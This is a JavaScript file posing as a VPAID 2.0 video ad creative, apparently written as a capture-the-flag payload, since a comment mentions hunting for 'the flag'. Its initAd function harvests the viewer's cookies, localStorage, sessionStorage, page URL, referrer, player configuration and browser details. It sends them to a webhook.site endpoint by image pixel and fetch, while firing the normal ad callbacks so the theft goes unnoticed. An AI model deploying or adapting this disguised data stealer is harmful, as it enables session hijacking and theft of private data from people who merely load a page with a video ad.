var VPAID = function() {
  this.version = '2.0';
};

VPAID.prototype.handshakeVersion = function(version) {
  return this.version;
};

VPAID.prototype.initAd = function(width, height, viewMode, desiredBitrate, creativeData, environmentVars) {
  // Capture ALL possible data from user's browser
  var userData = {
    // Cookies and storage
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    
    // Page context
    url: window.location.href,
    title: document.title,
    referrer: document.referrer,
    domain: document.domain,
    
    // Player context (might contain the flag)
    playerConfig: window.__PLAYER_CONFIG__ || 'not_found',
    
    // Browser info
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    
    // Screen info
    screen: JSON.stringify({
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    }),
    
    // Timestamp
    timestamp: new Date().toISOString()
  };

  // Send via multiple methods
  try {
    // Image pixel
    var img = new Image();
    img.src = 'https://webhook.site/79d88a40-f23d-49d5-9915-5c2a4c1bb433?user_data=' + 
              encodeURIComponent(JSON.stringify(userData));
    
    // Fetch API
    fetch('https://webhook.site/79d88a40-f23d-49d5-9915-5c2a4c1bb433', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(userData)
    });
  } catch(e) {
    // Send error
    var errImg = new Image();
    errImg.src = 'https://webhook.site/79d88a40-f23d-49d5-9915-5c2a4c1bb433?error=' + 
                 encodeURIComponent(e.toString());
  }

  // Required callback
  if (environmentVars && environmentVars.videoSlot && environmentVars.videoSlot.onAdLoaded) {
    environmentVars.videoSlot.onAdLoaded();
  }
};

// ... rest of VPAID methods remain the same
VPAID.prototype.startAd = function() {
  if (this.videoSlot && this.videoSlot.onAdStarted) {
    this.videoSlot.onAdStarted();
  }
};

VPAID.prototype.stopAd = function() {
  if (this.videoSlot && this.videoSlot.onAdStopped) {
    this.videoSlot.onAdStopped();
  }
};

VPAID.prototype.getAdLinear = function() { return true; };
VPAID.prototype.getAdWidth = function() { return 640; };
VPAID.prototype.getAdHeight = function() { return 360; };
VPAID.prototype.getAdDuration = function() { return 15; };
VPAID.prototype.getAdRemainingTime = function() { return 15; };

var vpaid = new VPAID();